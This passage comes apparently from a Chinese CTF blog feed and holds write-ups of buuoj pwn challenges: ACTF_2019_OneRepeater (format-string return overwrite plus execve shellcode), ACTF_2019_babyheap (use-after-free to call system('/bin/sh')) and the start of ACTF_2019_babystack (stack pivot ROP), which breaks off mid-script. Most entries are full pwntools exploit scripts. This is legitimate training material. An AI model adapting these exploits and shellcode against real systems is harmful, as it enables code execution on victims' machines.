<p>input操作还把栈地址泄露出来了：</p>
<p><img src="/images/7cf334f5/4.png" alt="input"></p>
<p>那就在栈上布置shellcode，利用格式化字符串漏洞改main函数返回地址到shellcode</p>
<p>找了个shellcode: <a href="http://shell-storm.org/shellcode/files/shellcode-841.php">http://shell-storm.org/shellcode/files/shellcode-841.php</a></p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
<span class="token comment">#!/usr/bin/python2</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ACTF_2019_OneRepeater'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27510</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../../libc32/libc-2.27.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token comment">#rs()</span>
rs<span class="token punctuation">(</span><span class="token string">'remote'</span><span class="token punctuation">)</span>
<span class="token comment"># print(ctx.libc.path)</span>


<span class="token comment"># leak stack</span>
sla<span class="token punctuation">(</span><span class="token string">' Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x410</span> <span class="token operator">+</span> <span class="token number">0xc</span>
s<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>

leak<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'ret_addr'</span><span class="token punctuation">,</span> ret_addr<span class="token punctuation">)</span>

<span class="token comment"># modify ret</span>
<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pay <span class="token operator">=</span> <span class="token string">'&#123;&#125;'</span> <span class="token operator">+</span> <span class="token string">'%&#123;&#125;c'</span> <span class="token operator">+</span> <span class="token string">'%16$hhn\x00'</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> content <span class="token operator">&amp;</span> <span class="token number">0xff</span>
        content <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span>

        sla<span class="token punctuation">(</span><span class="token string">' Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
        s<span class="token punctuation">(</span>pay<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p32<span class="token punctuation">(</span>ret_addr<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        sla<span class="token punctuation">(</span><span class="token string">' Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>

write<span class="token punctuation">(</span>ret_addr<span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span>

shellcode <span class="token operator">=</span> <span class="token string">''</span>
shellcode <span class="token operator">+=</span> <span class="token string">'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f'</span>
shellcode <span class="token operator">+=</span> <span class="token string">'\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd'</span>
shellcode <span class="token operator">+=</span> <span class="token string">'\x80'</span>

sla<span class="token punctuation">(</span><span class="token string">' Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">' Exit\n'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>

<span class="token comment">#dbg()</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>shellcode</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF_2019_babyheap</title>
    <url>/88978fd7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之ACTF_2019_babyheap</p>
<span id="more"></span>

<p>PIE没开，got表不可改<br><img src="/images/88978fd7/1.png" alt="checksec"></p>
<p>有add，delete，show功能，libc为2.27（有tcache）</p>
<p>system函数有了，都不用leak了：</p>
<p><img src="/images/88978fd7/2.png" alt="menu"></p>
<p>delete处free后指针没置为NULL</p>
<p><img src="/images/88978fd7/3.png" alt="delete"></p>
<p>结合show函数，uaf</p>
<p><img src="/images/88978fd7/4.png" alt="show"></p>
<p>node的格式：</p>
<p><img src="/images/88978fd7/5.png" alt="node"></p>
<p>直接uaf，改func成system，mem为指向<code>&#39;/bin/sh&#39;</code>字符串的指针</p>
<p>因为node的格式，覆盖func，也要覆盖mem，还是得先leak出，<code>&#39;/bin/sh&#39;</code>的位置</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ACTF_2019_babyheap'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../../libc/libc-2.27.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># rs('remote')</span>
<span class="token comment"># print(ctx.libc.path)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'size: \n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'content: \n'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'index: \n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'index: \n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>

free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># leak</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Content is '"</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">"'\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> system_addr <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

leak<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">,</span> str_bin_sh<span class="token punctuation">)</span>


free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># pwn!</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">#dbg()</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>UAF</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF_2019_babystack</title>
    <url>/8e27505e/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之ACTF_2019_babystack</p>
<span id="more"></span>


<p><img src="/images/8e27505e/1.png" alt="checksec"></p>
<p>漏洞明显，溢出rop，可溢出16个字节</p>
<p><img src="/images/8e27505e/2.png" alt="main"></p>
<p>栈迁移到变量s上，然后leak，onegadget一把梭</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ACTF_2019_babystack'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../../libc/libc-2.27.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>
rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># rs('remote')</span>
<span class="token comment"># print(ctx.libc.path)</span>

size <span class="token operator">=</span> <span class="token number">0xe0</span>
start <span class="token operator">=</span> <span class="token number">0x4008F6</span>
leave_ret <span class="token operator">=</span> <span class="token number">0x400a18</span>
format_str <span class="token operator">=</span> <span class="token number">0x400B58</span>
pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400ad3</span>
pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400ad1</span>


sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'saved at '</span><span class="token punctuation">)</span>
stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># ROP</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span> <span class="token comment"># rbp</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>
